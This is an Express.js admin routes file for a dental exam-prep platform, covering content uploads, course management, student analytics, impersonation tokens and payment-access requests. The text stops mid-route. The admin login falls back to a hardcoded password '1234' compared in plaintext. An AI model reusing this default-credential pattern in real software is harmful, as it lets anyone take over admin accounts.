const express = require("express");
const jwt = require("jsonwebtoken");
const crypto = require("crypto");
const path = require("path");
const fs = require("fs");
const multer = require("multer");
const { Course, Lesson, Quiz, Progress, Review, User, Subscription, AiChat, SubjectContent, AcademyProfile, PdfAccessRequest, generateId, getFilesBucket } = require("../db");

const router = express.Router();

// Local uploads dir kept only for legacy/dev. New uploads go to MongoDB GridFS so
// they persist across Render restarts.
const uploadsDir = path.resolve(__dirname, "../../../static/uploads");
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

const quizUpload = multer({ storage: multer.memoryStorage() });
const contentUpload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 50 * 1024 * 1024 } // 50MB per file
});

// Middleware: stream every uploaded buffer to GridFS, then expose the assigned
// filename on each file object so downstream code (createAssetRecord etc.) keeps
// working without changes.
async function uploadFilesToGridFS(req, _res, next) {
  if (!req.files) {
    return next();
  }

  try {
    const bucket = getFilesBucket();
    for (const fieldName of Object.keys(req.files)) {
      const files = req.files[fieldName];
      if (!Array.isArray(files)) continue;

      for (const file of files) {
        if (!file || !file.buffer) continue;

        const ext = path.extname(file.originalname || "") || "";
        const base = normalizeId(path.basename(file.originalname || "", ext)) || "asset";
        const unique = `${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
        const filename = `${unique}_${base}${ext}`;

        await new Promise((resolve, reject) => {
          const uploadStream = bucket.openUploadStream(filename, {
            contentType: file.mimetype || "application/octet-stream",
            metadata: { originalName: file.originalname || filename }
          });
          uploadStream.on("error", reject);
          uploadStream.on("finish", resolve);
          uploadStream.end(file.buffer);
        });

        file.filename = filename;
      }
    }
    return next();
  } catch (err) {
    console.error("GridFS upload failed:", err);
    return next(err);
  }
}

function normalizeId(value) {
  return String(value || "")
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "_")
    .replace(/^_+|_+$/g, "");
}

function splitValues(value) {
  return String(value || "")
    .split(/\r?\n|,/) 
    .map((item) => item.trim())
    .filter(Boolean);
}

function parseTagList(value) {
  return Array.from(new Set(splitValues(value)));
}

function isYoutubeUrl(value) {
  return /(?:youtube\.com|youtu\.be)/i.test(String(value || ""));
}

function normalizeAccessLevel(value) {
  return String(value || "free").trim().toLowerCase() === "paid" ? "paid" : "free";
}

function createAssetRecord(file, kind, index = 0, accessLevel = "free") {
  const ext = path.extname(file.originalname || "");
  const title = path.basename(file.originalname || `${kind}_${index + 1}`, ext) || `${kind} ${index + 1}`;
  const fileUrl = `/static/uploads/${file.filename}`;
  return {
    id: `${kind}_${generateId()}`,
    kind,
    title,
    fileName: file.originalname,
    fileUrl,
    url: fileUrl,
    accessLevel: normalizeAccessLevel(accessLevel),
    mimeType: file.mimetype || "application/octet-stream",
    size: file.size || 0
  };
}

function parseCaseStudies(value) {
  const raw = String(value || "").trim();
  if (!raw) {
    return [];
  }

  if (raw.startsWith("[")) {
    try {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) {
        return parsed
          .map((item, index) => ({
            id: item.id || `case_${generateId()}`,
            title: String(item.title || `Case Study ${index + 1}`).trim(),
            scenario: String(item.scenario || "").trim(),
            diagnosis: String(item.diagnosis || "").trim(),
            discussion: String(item.discussion || "").trim(),
            relevance: String(item.relevance || "").trim()
          }))
          .filter((item) => item.title || item.scenario || item.discussion || item.diagnosis);
      }
    } catch (_err) {
      // Fall through to block parsing.
    }
  }

  return raw
    .split(/\n\s*---+\s*\n/g)
    .map((block, index) => {
      const caseStudy = {
        id: `case_${generateId()}`,
        title: `Case Study ${index + 1}`,
        scenario: "",
        diagnosis: "",
        discussion: "",
        relevance: ""
      };
      let currentField = "scenario";

      block.split(/\r?\n/).forEach((line) => {
        const match = line.match(/^(title|scenario|diagnosis|discussion|relevance)\s*:\s*(.*)$/i);
        if (match) {
          currentField = match[1].toLowerCase();
          caseStudy[currentField] = match[2].trim();
          return;
        }

        if (!line.trim()) {
          return;
        }

        caseStudy[currentField] = `${caseStudy[currentField]}${caseStudy[currentField] ? "\n" : ""}${line.trim()}`;
      });

      return caseStudy;
    })
    .filter((item) => item.title || item.scenario || item.diagnosis || item.discussion || item.relevance);
}

function parseLineLinks(value, accessLevel) {
  const normalizedAccessLevel = accessLevel ? normalizeAccessLevel(accessLevel) : null;
  return String(value || "")
    .split(/\r?\n/)
    .map((line) => line.trim())
    .filter(Boolean)
    .map((line, index) => {
      const parts = line.split("|").map((part) => part.trim());
      if (parts.length >= 2) {
        const item = {
          title: parts[0] || `Resource ${index + 1}`,
          url: parts.slice(1).join("|") || "#"
        };
        if (normalizedAccessLevel) {
          item.accessLevel = normalizedAccessLevel;
        }
        return item;
      }

      const item = {
        title: `Resource ${index + 1}`,
        url: parts[0] || "#"
      };
      if (normalizedAccessLevel) {
        item.accessLevel = normalizedAccessLevel;
      }
      return item;
    });
}

function sanitizeLinks(value) {
  if (!Array.isArray(value)) {
    return [];
  }

  return value
    .map((item) => {
      if (!item || typeof item !== "object") {
        return null;
      }
      const raw = (item && typeof item.toObject === "function") ? item.toObject() : item;
      const doc = raw && raw._doc ? raw._doc : raw;
      const title = String((doc && doc.title) || "").trim();
      const rawUrl = (doc && doc.url) || "";
      const rawFileUrl = (doc && doc.fileUrl) || "";
      const accessLevel = normalizeAccessLevel((doc && doc.accessLevel) || "free");
      const preferredUrl = (rawUrl && String(rawUrl).trim() !== "#") ? rawUrl : (rawFileUrl || rawUrl || "");
      const url = String(preferredUrl || "").trim();
      if (!title && !url) {
        return null;
      }
      if (!url || url === "#") {
        return null;
      }
      return {
        title: title || url || "Resource",
        url,
        accessLevel
      };
    })
    .filter(Boolean);
}

function mergeUniqueStrings(existingValues, incomingValues) {
  const seen = new Set();
  const merged = [];

  const add = (value) => {
    const normalized = String(value || "").trim();
    if (!normalized) {
      return;
    }
    const key = normalized.toLowerCase();
    if (seen.has(key)) {
      return;
    }
    seen.add(key);
    merged.push(normalized);
  };

  (Array.isArray(existingValues) ? existingValues : []).forEach(add);
  (Array.isArray(incomingValues) ? incomingValues : []).forEach(add);

  return merged;
}

function normalizeBiochemistryTopics(blockKey, topics) {
  const requiredByBlock = {
    "block-a": 1,
    "block-b": 1,
    "block-c": 3
  };

  const normalizedBlockKey = String(blockKey || "").trim().toLowerCase();
  const required = requiredByBlock[normalizedBlockKey];

  const rawTopics = Array.isArray(topics) ? topics : [];
  const expanded = rawTopics.flatMap((topic) => {
    const value = String(topic || "").trim();
    if (!value) {
      return [];
    }

    if (normalizedBlockKey !== "block-c") {
      return [value];
    }

    // Support legacy combined formats like "1.Cervicofacial|2.GIT+UGS|3.Cardiopulmonary".
    return value
      .split(/[|\n,]+/)
      .map((part) => part.replace(/^\s*\d+[.)\-:\s]*/, "").trim())
      .filter(Boolean);
  });

  const normalized = mergeUniqueStrings([], expanded);
  if (!required) {
    return normalized;
  }

  if (normalized.length >= required) {
    return normalized.slice(0, required);
  }

  const filled = [...normalized];
  for (let index = filled.length; index < required; index += 1) {
    filled.push(`Topic ${index + 1}`);
  }
  return filled;
}

function mergeUniqueLinks(existingItems, incomingItems) {
  const seen = new Set();
  const merged = [];

  const add = (item) => {
    if (!item || typeof item !== "object") {
      return;
    }

    const raw = (item && typeof item.toObject === "function") ? item.toObject() : item;
    const doc = raw && raw._doc ? raw._doc : raw;
    const title = String((doc && doc.title) || "").trim();
    const rawUrl = (doc && doc.url) || "";
    const rawFileUrl = (doc && doc.fileUrl) || "";
    const accessLevel = normalizeAccessLevel((doc && doc.accessLevel) || "free");
    const preferredUrl = (rawUrl && String(rawUrl).trim() !== "#") ? rawUrl : (rawFileUrl || rawUrl || "");
    const url = String(preferredUrl || "").trim();

    if (!url || url === "#") {
      return;
    }

    const normalizedTitle = title || url || "Resource";
    const key = `${normalizedTitle.toLowerCase()}|${url.toLowerCase()}`;
    if (seen.has(key)) {
      return;
    }

    seen.add(key);
    merged.push({
      ...doc,
      title: normalizedTitle,
      url,
      accessLevel,
      fileUrl: String((doc && doc.fileUrl) || url).trim()
    });
  };

  (Array.isArray(existingItems) ? existingItems : []).forEach(add);
  (Array.isArray(incomingItems) ? incomingItems : []).forEach(add);

  return merged;
}

async function ensureAcademyProfile() {
  const existing = await AcademyProfile.findOne({ id: "academy_profile" });
  if (existing) {
    return existing;
  }

  return await AcademyProfile.findOneAndUpdate(
    { id: "academy_profile" },
    {
      id: "academy_profile",
      aboutAcademyText: "Dental Prep is your structured BDS preparation platform where each subject is organized into simple blocks, helping students move from fundamentals to clinical confidence.",
      bankDetails: {
          bankName: "Meezan Bank",
          accountTitle: "Dental Prep Official",
          accountNumber: "0123456789",
          iban: "PK00 MEZN 0000 0000 0000 0000"
      },
      generalOverview: {
        books: [{ title: "BDS Core Reading List", url: "#" }],
        premiumNotes: [{ title: "Premium Notes Pack", url: "#" }],
        importantSlides: [{ title: "Important Slides Collection", url: "#" }],
        shortNotes: [{ title: "Short Notes for Final Revision", url: "#" }],
        videos: Array.from({ length: 6 }).map((_, index) => ({
          title: `General Overview Video ${index + 1}`,
          url: "https://www.youtube.com/@pulseprepofficial"
        }))
      },
      aboutUs: {
        profileImageUrl: "/static/images/favicon.png",
        introVideoUrl: "https://www.youtube.com/@pulseprepofficial",
        notes: [{ title: "Academy Intro Notes", url: "#" }],
        pdfResources: [{ title: "Academy Resource PDF", url: "#" }],
        contactEmail: "admin@dentalprep.com",
        contactNumbers: ["+92 335 9591271"],
        socialLinks: {
          facebook: "https://facebook.com/profile.php?id=61576776451528",
          youtube: "https://www.youtube.com/@pulseprepofficial",
          instagram: "https://instagram.com/pulseprepofficial",
          linkedin: "https://linkedin.com/in/pulse-prep-778292368"
        }
      }
    },
    { new: true, upsert: true }
  );
}

async function buildStudentAnalytics() {
  const courses = await Course.find({});
  const lessons = await Lesson.find({});
  const quizzes = await Quiz.find({});
  const progressItems = await Progress.find({});
  const students = (await User.find({})).filter((user) => user.role !== "admin");

  const coursesById = courses.reduce((acc, course) => {
    acc[course.courseId] = course;
    return acc;
  }, {});
  const lessonsById = lessons.reduce((acc, lesson) => {
    acc[lesson.lessonId] = lesson;
    return acc;
  }, {});
  const quizzesById = quizzes.reduce((acc, quiz) => {
    acc[quiz.quizId] = quiz;
    return acc;
  }, {});
  const totalTrackableItems = lessons.length + quizzes.length;

  return students
    .map((student) => {
      const userProgress = progressItems.filter((item) => item.userId === student._id);
      const completedLessons = userProgress.filter((item) => item.itemType === "lesson" && item.completed).length;
      const quizAttempts = userProgress.filter((item) => item.itemType === "quiz");
      const avgScore = quizAttempts.length
        ? Math.round(quizAttempts.reduce((sum, item) => sum + (Number(item.score) || 0), 0) / quizAttempts.length)
        : 0;
      const weakAreas = quizAttempts
        .filter((item) => Number(item.score) < 70)
        .sort((left, right) => Number(left.score) - Number(right.score))
        .slice(0, 3)
        .map((item) => {
          const quiz = quizzesById[item.quizId || item.referenceId];
          const lesson = lessonsById[item.lessonId || quiz?.lessonId];
          const course = coursesById[item.courseId || lesson?.courseId || quiz?.courseId];
          return {
            quizTitle: quiz ? quiz.title : item.title || "Quiz",
            lessonTitle: lesson ? lesson.title : "Lesson",
            courseTitle: course ? course.title : item.courseId,
            score: Number(item.score) || 0
          };
        });

      return {
        userId: student._id,
        name: student.name || "Student",
        email: student.email || "",
        completedLessons,
        quizAttempts: quizAttempts.length,
        avgScore,
        completionRate: totalTrackableItems
          ? Math.round(((completedLessons + quizAttempts.filter((item) => item.completed).length) / totalTrackableItems) * 100)
          : 0,
        weakAreas,
        updatedAt: userProgress[0]?.updatedAt || student.updatedAt || student.createdAt
      };
    })
    .sort((left, right) => right.completionRate - left.completionRate || right.avgScore - left.avgScore);
}

async function buildManagedStudents() {
  const courses = await Course.find({});
  const lessons = await Lesson.find({});
  const quizzes = await Quiz.find({});
  const progressItems = await Progress.find({});
  const students = (await User.find({})).filter((user) => user.role !== "admin");

  const coursesById = courses.reduce((acc, course) => {
    acc[course.courseId] = course;
    return acc;
  }, {});
  const lessonsById = lessons.reduce((acc, lesson) => {
    acc[lesson.lessonId] = lesson;
    return acc;
  }, {});
  const quizzesById = quizzes.reduce((acc, quiz) => {
    acc[quiz.quizId] = quiz;
    return acc;
  }, {});
  const totalTrackableItems = lessons.length + quizzes.length;

  return students
    .map((student) => {
      const userProgress = progressItems.filter((item) => item.userId === student._id);
      const completedLessons = userProgress.filter((item) => item.itemType === "lesson" && item.completed).length;
      const quizAttempts = userProgress.filter((item) => item.itemType === "quiz");
      const avgScore = quizAttempts.length
        ? Math.round(quizAttempts.reduce((sum, item) => sum + (Number(item.score) || 0), 0) / quizAttempts.length)
        : 0;

      return {
        userId: student._id,
        name: student.name || "Student",
        email: student.email || "",
        role: student.role || "student",
        isVerified: Boolean(student.isVerified),
        accountStatus: student.accountStatus || "active",
        completedLessons,
        quizAttempts: quizAttempts.length,
        avgScore,
        completionRate: totalTrackableItems
          ? Math.round(((completedLessons + quizAttempts.filter((item) => item.completed).length) / totalTrackableItems) * 100)
          : 0,
        weakAreas: quizAttempts
          .filter((item) => Number(item.score) < 70)
          .sort((left, right) => Number(left.score) - Number(right.score))
          .slice(0, 3)
          .map((item) => {
            const quiz = quizzesById[item.quizId || item.referenceId];
            const lesson = lessonsById[item.lessonId || quiz?.lessonId];
            const course = coursesById[item.courseId || lesson?.courseId || quiz?.courseId];
            return {
              quizTitle: quiz ? quiz.title : item.title || "Quiz",
              lessonTitle: lesson ? lesson.title : "Lesson",
              courseTitle: course ? course.title : item.courseId,
              score: Number(item.score) || 0
            };
          }),
        updatedAt: userProgress[0]?.updatedAt || student.updatedAt || student.createdAt
      };
    })
    .sort((left, right) => right.completionRate - left.completionRate || right.avgScore - left.avgScore);
}

function createTemporaryPassword() {
  return crypto.randomBytes(6).toString("base64url").replace(/[^a-zA-Z0-9]/g, "").slice(0, 10) || `Temp${generateId().slice(0, 6)}`;
}

function adminAuth(req, res, next) {
  const authHeader = req.headers.authorization || "";
  const token = authHeader.startsWith("Bearer ") ? authHeader.slice(7) : null;

  if (!token) {
    return res.status(401).json({ message: "Missing admin token" });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    if (decoded.role !== "admin") {
      return res.status(403).json({ message: "Forbidden" });
    }
    req.admin = decoded;
    return next();
  } catch (_err) {
    return res.status(401).json({ message: "Invalid admin token" });
  }
}

router.post("/admin/login", (req, res) => {
  const { email, password } = req.body || {};
  const adminEmail = process.env.ADMIN_EMAIL || "admin@dentalprep.com";
  const adminPassword = process.env.ADMIN_PASSWORD || "1234";

  if (email !== adminEmail || password !== adminPassword) {
    return res.status(401).json({ message: "Invalid admin credentials" });
  }

  const token = jwt.sign({ role: "admin", email }, process.env.JWT_SECRET, { expiresIn: "7d" });
  return res.json({ token });
});

router.post("/admin/course", adminAuth, async (req, res) => {
  try {
    const { title, description, category, curriculumTags, courseId } = req.body || {};
    if (!title) {
      return res.status(400).json({ message: "Title is required" });
    }

    const id = courseId || `course_${normalizeId(title)}`;
    const course = await Course.findOneAndUpdate(
      { courseId: id },
      {
        courseId: id,
        title,
        description: String(description || "").trim(),
        category: String(category || "").trim(),
        curriculumTags: parseTagList(curriculumTags)
      },
      { new: true, upsert: true }
    );

    return res.status(201).json({
      course: {
        id: course.courseId,
        title: course.title,
        description: course.description || "",
        category: course.category || "",
        curriculumTags: course.curriculumTags || []
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.delete("/admin/course/:courseId", adminAuth, async (req, res) => {
  try {
    const courseId = String(req.params.courseId || "").trim();
    if (!courseId) {
      return res.status(400).json({ message: "Course ID is required" });
    }

    const course = await Course.findOne({ courseId });
    if (!course) {
      return res.status(404).json({ message: "Course not found" });
    }

    const lessonRows = await Lesson.find({ courseId }, { lessonId: 1 });
    const lessonIds = lessonRows.map((row) => row.lessonId).filter(Boolean);

    const directQuizRows = await Quiz.find({ courseId }, { quizId: 1 });
    const lessonQuizRows = lessonIds.length ? await Quiz.find({ lessonId: { $in: lessonIds } }, { quizId: 1 }) : [];
    const quizIds = Array.from(new Set([...directQuizRows, ...lessonQuizRows].map((row) => row.quizId).filter(Boolean)));

    const progressOrFilters = [{ courseId }];
    if (lessonIds.length) {
      progressOrFilters.push({ lessonId: { $in: lessonIds } });
      progressOrFilters.push({ referenceId: { $in: lessonIds } });
    }
    if (quizIds.length) {
      progressOrFilters.push({ quizId: { $in: quizIds } });
      progressOrFilters.push({ referenceId: { $in: quizIds } });
    }

    const [deletedLessons, deletedQuizzes, deletedReviews, deletedProgress, deletedCourse] = await Promise.all([
      Lesson.deleteMany({ courseId }),
      Quiz.deleteMany({ $or: [{ courseId }, ...(lessonIds.length ? [{ lessonId: { $in: lessonIds } }] : [])] }),
      Review.deleteMany({ courseId }),
      Progress.deleteMany({ $or: progressOrFilters }),
      Course.deleteOne({ courseId })
    ]);

    return res.json({
      message: "Course and related data deleted permanently",
      deleted: {
        course: deletedCourse.deletedCount || 0,
        lessons: deletedLessons.deletedCount || 0,
        quizzes: deletedQuizzes.deletedCount || 0,
        reviews: deletedReviews.deletedCount || 0,
        progress: deletedProgress.deletedCount || 0
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

// GET /api/courses - Get all courses for admin dropdown (requires admin auth)
router.get("/admin/courses", adminAuth, async (_req, res) => {
  try {
    const courses = await Course.find({}).sort({ title: 1 });
    const allLessons = await Lesson.find({});
    const allQuizzes = await Quiz.find({});
    
    const data = courses.map((course) => {
      const courseLessons = allLessons.filter((lesson) => lesson.courseId === course.courseId);
      const courseQuizzes = allQuizzes.filter((quiz) => quiz.courseId === course.courseId);
      
      return {
        id: course.courseId,
        title: course.title,
        description: course.description || "",
        category: course.category || "",
        curriculumTags: course.curriculumTags || [],
        lessonsCount: courseLessons.length,
        quizCount: courseQuizzes.length
      };
    });
    
    res.json({ courses: data });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

// GET /api/lessons - Get all lessons for admin panel (requires admin auth)
router.get("/admin/lessons", adminAuth, async (_req, res) => {
  try {
    const lessons = await Lesson.find({}).sort({ title: 1 });
    const data = lessons.map((lesson) => ({
      id: lesson.lessonId,
      title: lesson.title,
      courseId: lesson.courseId,
      summary: lesson.summary || "",
      videoUrl: lesson.videoUrl || ""
    }));
    res.json({ lessons: data });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

// GET /api/quizzes - Get all quizzes for admin panel (requires admin auth)
router.get("/admin/quizzes", adminAuth, async (_req, res) => {
  try {
    const quizzes = await Quiz.find({}).sort({ title: 1 });
    const data = quizzes.map((quiz) => ({
      id: quiz.quizId,
      title: quiz.title,
      courseId: quiz.courseId,
      lessonId: quiz.lessonId,
      questionCount: (quiz.questions || []).length
    }));
    res.json({ quizzes: data });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.get("/admin/overview", adminAuth, async (_req, res) => {
  try {
    const courses = await Course.find({});
    const lessons = await Lesson.find({});
    const quizzes = await Quiz.find({});
    const progressItems = (await Progress.find({})).sort((left, right) => new Date(right.updatedAt || right.createdAt || 0) - new Date(left.updatedAt || left.createdAt || 0));
    const reviews = (await Review.find({})).sort((left, right) => new Date(right.updatedAt || right.createdAt || 0) - new Date(left.updatedAt || left.createdAt || 0));
    const quizAttempts = progressItems.filter((item) => item.itemType === "quiz" || item.quizId);
    const usersById = (await User.find({})).reduce((acc, user) => {
      acc[user._id] = user;
      return acc;
    }, {});
    const quizzesById = quizzes.reduce((acc, quiz) => {
      acc[quiz.quizId] = quiz;
      return acc;
    }, {});
    const coursesById = courses.reduce((acc, course) => {
      acc[course.courseId] = course;
      return acc;
    }, {});
    const studentAnalytics = await buildStudentAnalytics();

    const recentResults = quizAttempts
      .map((item) => {
        const user = usersById[item.userId];
        const quiz = quizzesById[item.quizId || item.referenceId] || null;
        const course = coursesById[item.courseId] || null;
        return {
          id: item._id,
          userName: user ? user.name : "Student",
          userEmail: user ? user.email : "",
          quizTitle: quiz ? quiz.title : item.title || "Quiz",
          courseTitle: course ? course.title : item.courseId,
          score: item.score || 0,
          completed: Boolean(item.completed),
          updatedAt: item.updatedAt || item.createdAt
        };
      })
      .slice(0, 10);

    const recentReviews = reviews
      .map((review) => {
        const user = usersById[review.userId];
        const course = coursesById[review.courseId];
        return {
          id: review._id,
          userName: user ? user.name : review.userName || "Student",
          courseTitle: course ? course.title : review.courseId,
          rating: review.rating,
          comment: review.comment,
          createdAt: review.createdAt
        };
      })
      .slice(0, 10);

    const audioCount = lessons.reduce((sum, lesson) => sum + ((lesson.audioItems || []).length || 0), 0);
    const materialCount = lessons.reduce((sum, lesson) => sum + ((lesson.materials || []).length || 0), 0);
    const caseStudyCount = lessons.reduce((sum, lesson) => sum + ((lesson.caseStudies || []).length || 0), 0);

    return res.json({
      counts: {
        courses: courses.length,
        lessons: lessons.length,
        quizzes: quizzes.length,
        quizAttempts: quizAttempts.length,
        reviews: reviews.length,
        students: studentAnalytics.length,
        audios: audioCount,
        materials: materialCount,
        caseStudies: caseStudyCount
      },
      recentResults,
      recentReviews,
      studentAnalytics: studentAnalytics.slice(0, 5)
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.get("/admin/student-analytics", adminAuth, async (_req, res) => {
  try {
    return res.json({ students: await buildStudentAnalytics() });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.get("/admin/users", adminAuth, async (_req, res) => {
  try {
    return res.json({ students: await buildManagedStudents() });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/users/:userId/block", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin accounts cannot be blocked" });
    }

    const updated = await User.findByIdAndUpdate(userId, {
      accountStatus: "blocked",
      updatedAt: new Date()
    }, { new: true });

    return res.json({
      message: "User blocked",
      user: {
        id: updated._id,
        name: updated.name,
        email: updated.email,
        accountStatus: updated.accountStatus || "blocked"
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/users/:userId/approve", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin account cannot be changed" });
    }

    const updated = await User.findByIdAndUpdate(userId, {
      accountStatus: "active",
      updatedAt: new Date()
    }, { new: true });

    return res.json({
      message: "Student approved successfully",
      user: {
        id: updated._id,
        name: updated.name,
        email: updated.email,
        accountStatus: updated.accountStatus || "active"
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/users/:userId/reject", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin account cannot be changed" });
    }

    const updated = await User.findByIdAndUpdate(userId, {
      accountStatus: "blocked",
      updatedAt: new Date()
    }, { new: true });

    return res.json({
      message: "Student rejected",
      user: {
        id: updated._id,
        name: updated.name,
        email: updated.email,
        accountStatus: updated.accountStatus || "blocked"
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/users/:userId/unblock", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin accounts do not use block status" });
    }

    const updated = await User.findByIdAndUpdate(userId, {
      accountStatus: "active",
      updatedAt: new Date()
    }, { new: true });

    return res.json({
      message: "User unblocked",
      user: {
        id: updated._id,
        name: updated.name,
        email: updated.email,
        accountStatus: updated.accountStatus || "active"
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/users/:userId/reset-password", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin password is managed separately" });
    }

    const tempPassword = String(req.body?.password || "").trim() || createTemporaryPassword();
    const bcrypt = require("bcryptjs");
    const passwordHash = await bcrypt.hash(tempPassword, 10);

    await User.findByIdAndUpdate(userId, {
      passwordHash,
      password: undefined,
      resetPasswordToken: null,
      resetPasswordExpires: null,
      updatedAt: new Date()
    });

    return res.json({
      message: "Password reset successfully",
      tempPassword
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/users/:userId/impersonate", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin account impersonation is not allowed" });
    }

    const token = jwt.sign(
      {
        id: user._id,
        email: user.email,
        role: user.role || "student",
        impersonatedBy: req.admin.email,
        impersonatedByRole: "admin"
      },
      process.env.JWT_SECRET,
      { expiresIn: "7d" }
    );

    return res.json({
      token,
      user: {
        id: user._id,
        name: user.name,
        email: user.email,
        role: user.role || "student",
        accountStatus: user.accountStatus || "active"
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.delete("/admin/users/:userId", adminAuth, async (req, res) => {
  try {
    const userId = String(req.params.userId || "").trim();
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    if ((user.role || "student") === "admin") {
      return res.status(403).json({ message: "Admin accounts cannot be deleted here" });
    }

    await Promise.all([
      Progress.deleteMany({ userId }),
      Subscription.deleteMany({ userId }),
      Review.deleteMany({ userId }),
      AiChat.deleteMany({ userId }),
      PdfAccessRequest.deleteMany({ userId }),
      User.deleteOne({ _id: userId })
    ]);

    return res.json({ message: "User deleted permanently" });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.get("/admin/pdf-access-requests", adminAuth, async (_req, res) => {
  try {
    const requests = await PdfAccessRequest.find({});
    const usersById = (await User.find({})).reduce((acc, user) => {
      acc[user._id] = user;
      return acc;
    }, {});

    const items = requests
      .sort((a, b) => new Date(b.updatedAt || b.createdAt || 0) - new Date(a.updatedAt || a.createdAt || 0))
      .map((request) => {
        const user = usersById[request.userId];
        return {
          id: request._id,
          userId: request.userId,
          userName: user ? user.name : "Student",
          userEmail: user ? user.email : "",
          subjectKey: request.subjectKey,
          blockKey: request.blockKey,
          sectionName: request.sectionName,
          amount: Number(request.amount || 500),
          paymentMethod: request.paymentMethod || "easypaisa",
          easypaisaNumber: request.easypaisaNumber || "03327939323",
          easypaisaAccountName: request.easypaisaAccountName || "Muhammad Yousaf",
          paymentProof: request.paymentProof || "",
          status: request.status || "pending",
          adminNote: request.adminNote || "",
          reviewedBy: request.reviewedBy || "",
          reviewedAt: request.reviewedAt || null,
          createdAt: request.createdAt || null
        };
      });

    return res.json({ requests: items });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/pdf-access-requests/:requestId/approve", adminAuth, async (req, res) => {
  try {
    const requestId = String(req.params.requestId || "").trim();
    const request = await PdfAccessRequest.findOne({ _id: requestId });
    if (!request) {
      return res.status(404).json({ message: "Request not found" });
    }

    const updated = await PdfAccessRequest.findOneAndUpdate(
      { _id: requestId },
      {
        status: "approved",
        reviewedBy: req.admin.email || "admin",
        reviewedAt: new Date(),
        adminNote: String(req.body?.adminNote || "Approved").trim(),
        updatedAt: new Date()
      },
      { new: true }
    );

    return res.json({ message: "PDF access approved", request: updated });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post("/admin/pdf-access-requests/:requestId/reject", adminAuth, async (req, res) => {
  try {
    const requestId = String(req.params.requestId || "").trim();
    const request = await PdfAccessRequest.findOne({ _id: requestId });
    if (!request) {
      return res.status(404).json({ message: "Request not found" });
    }

    const updated = await PdfAccessRequest.findOneAndUpdate(
      { _id: requestId },
      {
        status: "rejected",
        reviewedBy: req.admin.email || "admin",
        reviewedAt: new Date(),
        adminNote: String(req.body?.adminNote || "Rejected").trim(),
        updatedAt: new Date()
      },
      { new: true }
    );

    return res.json({ message: "PDF access request rejected", request: updated });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.get("/admin/academy/content", adminAuth, async (_req, res) => {
  try {
    const profile = await ensureAcademyProfile();
    const blocksRaw = await SubjectContent.find({});
    const blocks = blocksRaw.map((row) => {
      const doc = row && typeof row.toObject === "function" ? row.toObject() : row;
      const subjectKey = String(doc?.subjectKey || "").trim().toLowerCase();
      if (subjectKey !== "biochemistry") {
        return doc;
      }

      const normalizedTopics = normalizeBiochemistryTopics(doc?.blockKey, doc?.topics || []);
      const normalizedSections = normalizedTopics.map((topicName) => {
        const existing = (Array.isArray(doc?.sections) ? doc.sections : []).find((section) => String(section?.name || "").trim().toLowerCase() === String(topicName || "").trim().toLowerCase());
        return existing || {
          name: topicName,
          videoItems: [],
          noteText: "",
          noteResources: [],
          clinicalText: "",
          clinicalResources: []
        };
      });

      return {
        ...doc,
        topics: normalizedTopics,
        sections: normalizedSections
      };
    });

    return res.json({
      profile,
      blocks
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post(
  "/admin/academy/block",
  adminAuth,
  contentUpload.fields([
    { name: "videoFiles", maxCount: 100 },
    { name: "noteFiles", maxCount: 100 },
    { name: "clinicalFiles", maxCount: 100 }
  ]),
